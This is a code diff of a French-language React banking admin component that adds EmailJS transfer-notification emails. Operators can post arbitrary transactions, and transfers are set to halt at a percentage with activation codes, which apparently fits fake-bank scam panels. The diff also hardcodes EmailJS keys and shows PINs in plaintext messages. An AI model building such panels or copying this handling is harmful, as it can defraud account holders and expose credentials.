@@ -12,6 +12,7 @@ import {
   onSnapshot,
   addDoc,
 } from "firebase/firestore";
+import emailjs from "@emailjs/browser";
 
 import { LANGUES } from "../../data/tableau des banque/data";
 import { currencies } from "../../data/clientData";
@@ -38,6 +39,11 @@ const FlashAccountUpdater = () => {
   const [error, setError] = useState(null);
   const [success, setSuccess] = useState(null);
   const [submittingAction, setSubmittingAction] = useState(false);
+
+  // ✅ Configuration EmailJS - À REMPLACER PAR VOS IDENTIFIANTS
+  const EMAILJS_SERVICE_ID = "service_csghyj7"; // Ex: "service_abc123"
+  const EMAILJS_TEMPLATE_ID = "template_p30q2h7"; // Ex: "template_xyz789"
+  const EMAILJS_PUBLIC_KEY = "fzwU8-p8-20lNC6Mr"; // Ex: "abcd1234efgh5678"
 
   const updateClientState = (updateData) => {
     setClients((prevClients) =>
@@ -128,6 +134,56 @@ const FlashAccountUpdater = () => {
     setError(null);
   };
 
+  // ✅ Fonction pour envoyer un email via EmailJS
+  const sendEmailNotification = async (emailData) => {
+    try {
+      console.log("📧 === DÉBUT ENVOI EMAIL VIA EMAILJS ===");
+      console.log("📧 Données email:", JSON.stringify(emailData, null, 2));
+
+      // Préparer les paramètres du template EmailJS
+      const templateParams = {
+        to_email: emailData.to,
+        to_name: emailData.recipientName,
+        transaction_type:
+          emailData.transactionType === "credit"
+            ? "Virement reçu"
+            : emailData.transactionType === "refund"
+            ? "Remboursement reçu"
+            : "Virement effectué",
+        amount: `${emailData.amount.toFixed(2)} ${emailData.currency}`,
+        sender: emailData.sender,
+        date: emailData.date,
+        new_balance: `${emailData.newBalance.toFixed(2)} ${emailData.currency}`,
+        transaction_id: emailData.transactionId,
+        subject:
+          emailData.transactionType === "credit"
+            ? "💰 Virement reçu sur votre compte"
+            : emailData.transactionType === "refund"
+            ? "↩️ Remboursement reçu"
+            : "📤 Virement effectué",
+      };
+
+      console.log("📤 Paramètres template:", templateParams);
+
+      // Envoyer l'email via EmailJS
+      const response = await emailjs.send(
+        EMAILJS_SERVICE_ID,
+        EMAILJS_TEMPLATE_ID,
+        templateParams,
+        EMAILJS_PUBLIC_KEY
+      );
+
+      console.log("✅ Email envoyé avec succès! Réponse:", response);
+      console.log("📧 === FIN ENVOI EMAIL ===");
+      return true;
+    } catch (error) {
+      console.error("❌ === ERREUR ENVOI EMAIL ===");
+      console.error("Erreur complète:", error);
+      console.error("Message erreur:", error.text || error.message);
+      return false;
+    }
+  };
+
   const handleActionSubmit = async (formData) => {
     setSubmittingAction(true);
     setError(null);
@@ -187,7 +243,7 @@ const FlashAccountUpdater = () => {
             )}.`;
           }
 
-          // ✅ Structure de transaction corrigée - Retirer les champs undefined
+          // ✅ Structure de transaction corrigée
           const transactionEntry = {
             type: selectedAction.replace("fc-", ""),
             description: description || "Opération Agent",
@@ -196,7 +252,6 @@ const FlashAccountUpdater = () => {
             status: "completed",
           };
 
-          // ✅ Ajouter sender ou beneficiaryName seulement s'ils existent
           if (
             selectedAction === "fc-credit" ||
             selectedAction === "fc-refund"
@@ -291,6 +346,39 @@ const FlashAccountUpdater = () => {
             // Ne pas bloquer la transaction si la notification échoue
           }
 
+          // ✅ ENVOYER UN EMAIL SI LA CASE EST COCHÉE
+          if (formData.sendEmailAlert && selectedClientData.email) {
+            console.log("📧 Envoi d'email demandé via EmailJS...");
+
+            const emailData = {
+              to: selectedClientData.email,
+              recipientName: `${selectedClientData.prenom} ${selectedClientData.nom}`,
+              transactionType:
+                selectedAction === "fc-credit"
+                  ? "credit"
+                  : selectedAction === "fc-refund"
+                  ? "refund"
+                  : "debit",
+              amount: amount,
+              currency: selectedClientData.devise || "€",
+              sender: description || "Agent Flashtech",
+              date: transactionDate,
+              newBalance: newSolde,
+              transactionId: `TRX-${Date.now()}-${Math.random()
+                .toString(36)
+                .substr(2, 9)
+                .toUpperCase()}`,
+            };
+
+            const emailSent = await sendEmailNotification(emailData);
+
+            if (emailSent) {
+              successMessage += " 📧 Email de notification envoyé.";
+            } else {
+              successMessage += " ⚠️ Email non envoyé (erreur serveur).";
+            }
+          }
+
           break;
 
         case "fc-bank-color":
@@ -312,7 +400,7 @@ const FlashAccountUpdater = () => {
           break;
 
         case "fc-new-codepin":
-          updateData = { pinAccess: formData.pin }; // ✅ pinAccess au lieu de codePin
+          updateData = { pinAccess: formData.pin };
           successMessage = `Code PIN de connexion changé. Nouveau PIN: ${formData.pin}.`;
           break;
 
@@ -325,7 +413,7 @@ const FlashAccountUpdater = () => {
           updateData = {
             pourcentageDepart: formData.percentageStart,
             pourcentageArret: formData.percentageStop,
-            messageApresVirement: formData.stopMessage, // ✅ messageApresVirement au lieu de stopMessage
+            messageApresVirement: formData.stopMessage,
           };
           successMessage = `Pourcentages de virement mis à jour.`;
           break;
@@ -341,7 +429,7 @@ const FlashAccountUpdater = () => {
           break;
 
         case "fc-new-codetransfer":
-          updateData = { codeActivationVirement: formData.newTransferCode }; // ✅ codeActivationVirement au lieu de codeTransfert
+          updateData = { codeActivationVirement: formData.newTransferCode };
           successMessage = `Code d'activation virement changé en ${formData.newTransferCode}.`;
           break;
 
